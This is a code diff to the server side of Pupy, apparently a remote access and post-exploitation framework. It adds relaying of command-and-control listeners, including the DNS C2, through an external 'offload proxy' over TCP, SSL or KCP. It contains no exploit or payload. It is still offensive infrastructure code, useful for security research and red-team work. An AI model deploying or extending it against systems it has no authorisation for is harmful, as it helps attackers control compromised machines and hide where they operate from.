@@ -26,7 +26,10 @@ from .PupyConfig import PupyConfig
 from .PupyService import PupyBindService
 from .PupyCompile import pupycompile
 from network.conf import transports
+from network.transports.ssl.conf import PupySSLAuthenticator
 from network.lib.connection import PupyConnectionThread
+from network.lib.servers import PupyTCPServer
+from network.lib.streams.PupySocketStream import PupySocketStream, PupyUDPSocketStream
 from pupylib.utils.rpyc_utils import obtain
 from pupylib.utils.network import get_listener_ip_with_local
 from pupylib.PupyDnsCnc import PupyDnsCnc
@@ -43,6 +46,7 @@ from shutil import copyfile
 from itertools import count, ifilterfalse
 from netaddr import IPAddress
 from random import randint
+from .PupyOffload import PupyOffloadManager
 import marshal
 import network.conf
 import rpyc
@@ -57,8 +61,13 @@ import os.path
 class ListenerException(Exception):
     pass
 
+class PupyKCPSocketStream(PupySocketStream):
+    def __init__(self, *args, **kwargs):
+        PupySocketStream.__init__(self, *args, **kwargs)
+        self.KEEP_ALIVE_REQUIRED = 15
+
 class Listener(Thread):
-    def __init__(self, pupsrv, name, args, httpd=False, igd=False, local=None, external=None):
+    def __init__(self, pupsrv, name, args, httpd=False, igd=False, local=None, external=None, pproxy=None):
         Thread.__init__(self)
         self.daemon = True
 
@@ -75,6 +84,7 @@ class Listener(Thread):
         # Where to connect
         self.external = external
         self.external_port = None
+        self.pproxy = pproxy
 
         # Where to bind
         self.address = local or ''
@@ -126,7 +136,10 @@ class Listener(Thread):
                 port = args[0]
                 self.ipv6 = False
 
-        if not self.external or self.external in ('?', 'igd') :
+        if self.pproxy:
+            self.external = self.pproxy.external
+
+        elif not self.external or self.external in ('?', 'igd') :
             # If IGD enabled then we likely want to have mappings
             # Why to have mappings if our external IP remains empty?
             if self.igd and self.igd.available:
@@ -194,19 +207,66 @@ class Listener(Thread):
             logging.exception(e)
 
     def init(self):
-        self.server = self.transport.server(
+        proxy = None
+        method = None
+
+        stream = self.transport.stream
+        transport = self.transport.server_transport
+        server = self.transport.server
+        transport_kwargs = self.transport.server_transport_kwargs
+        ipv6 = self.ipv6
+        igd = self.igd
+        external = self.external
+        external_port = self.external_port
+        authenticator = self.authenticator
+
+        if self.pproxy:
+            if type(authenticator) == PupySSLAuthenticator:
+                extra = {
+                    'certs': {
+                        'ca': authenticator.castr,
+                        'cert': authenticator.certstr,
+                        'key': authenticator.keystr,
+                    }
+                }
+            else:
+                extra = {}
+
+            if stream == PupyUDPSocketStream:
+                stream = PupyKCPSocketStream
+                method = self.pproxy.kcp
+            elif type(authenticator) == PupySSLAuthenticator:
+                method = self.pproxy.ssl
+            elif stream == PupySocketStream:
+                method = self.pproxy.tcp
+
+            server = PupyTCPServer
+
+            authenticator = None
+            ipv6 = False
+            igd = None
+            self.port = 0
+
+        self.server = server(
             PupyService,
             port=self.port, hostname=self.address,
-            authenticator=self.authenticator,
-            stream=self.transport.stream,
-            transport=self.transport.server_transport,
-            transport_kwargs=self.transport.server_transport_kwargs,
+            authenticator=authenticator,
+            stream=stream,
+            transport=transport,
+            transport_kwargs=transport_kwargs,
             pupy_srv=self.pupsrv,
-            ipv6=self.ipv6,
-            igd=self.igd,
-            external=self.external,
-            external_port=self.external_port
+            ipv6=ipv6,
+            igd=igd,
+            external=external,
+            external_port=external_port
         )
+
+        if not ( self.pproxy and method ):
+            return
+
+        ## Workaround..
+        self.server.listener.close()
+        self.server.listener = method(self.external_port, extra=extra)
 
     def run(self):
         self.server.start()
@@ -230,6 +290,11 @@ class Listener(Thread):
         self.close()
 
     def __str__(self):
+        if self.port == 0:
+            return '{}: pproxy:{}:{}'.format(
+                self.name, self.external, self.external_port
+            )
+
         result = str(self.port)
         if self.address:
             result = '{}:{}'.format(
@@ -280,25 +345,49 @@ class PupyServer(object):
         self._cleanups = []
         self._singles = {}
 
+        self.pproxy = None
+
+        pproxy = self.config.get('pproxy', 'address')
+        ca = self.config.get('pproxy', 'ca')
+        key = self.config.get('pproxy', 'key')
+        cert = self.config.get('pproxy', 'crt')
+        via = self.config.get('pproxy', 'via')
+
+        if pproxy and ca and key and cert:
+            try:
+                self.pproxy = PupyOffloadManager(
+                    pproxy, ca, key, cert, via)
+                self.motd['ok'].append(
+                    'Offload Proxy: proxy={} external={}{}'.format(
+                        pproxy,
+                        self.pproxy.external,
+                        ' via {}'.format(via) if via else ''))
+            except Exception, e:
+                self.pproxy = None
+                logging.exception(e)
+                self.motd['fail'].append('Using Pupy Offload Proxy: Failed: {}'.format(e))
+
         if self.config.getboolean('pupyd', 'httpd'):
             self.httpd = True
 
-        try:
+        if not self.pproxy:
             try:
-                igd_url = None
-                igd_enabled = config.getboolean('pupyd', 'igd')
-            except ValueError:
-                igd = config.get('pupyd', 'igd')
-                if igd:
-                    igd_enabled = True
-                    igd_url = igd
+                try:
+                    igd_url = None
+                    igd_enabled = config.getboolean('pupyd', 'igd')
+                except ValueError:
+                    igd = config.get('pupyd', 'igd')
+                    if igd:
+                        igd_enabled = True
+                        igd_url = igd
 
-            self.igd = IGDClient(
-                available=igd_enabled,
-                ctrlURL=igd_url
-            )
-        except UPNPError as e:
-            pass
+                self.igd = IGDClient(
+                    available=igd_enabled,
+                    ctrlURL=igd_url
+                )
+                self.motd['ok'].append('IGDClient enabled')
+            except UPNPError as e:
+                self.motd['fail'].append('IGDClient failed: {}'.format(e))
 
         self.dnscnc = None
 
@@ -318,7 +407,8 @@ class PupyServer(object):
                     config=self.config,
                     credentials=self.credentials,
                     listeners=self.get_listeners,
-                    cmdhandler=self.handler
+                    cmdhandler=self.handler,
+                    pproxy=self.pproxy,
                 )
             except Exception, e:
                 logging.error('DnsCNC failed: {}'.format(e))
@@ -346,7 +436,8 @@ class PupyServer(object):
                 httpd=self.httpd,
                 igd=self.igd,
                 local=self.config.get('pupyd', 'address'),
-                external=self.config.get('pupyd', 'external')
+                external=self.config.get('pupyd', 'external'),
+                pproxy=self.pproxy
             ) for name in listeners
         }
         return self._listeners
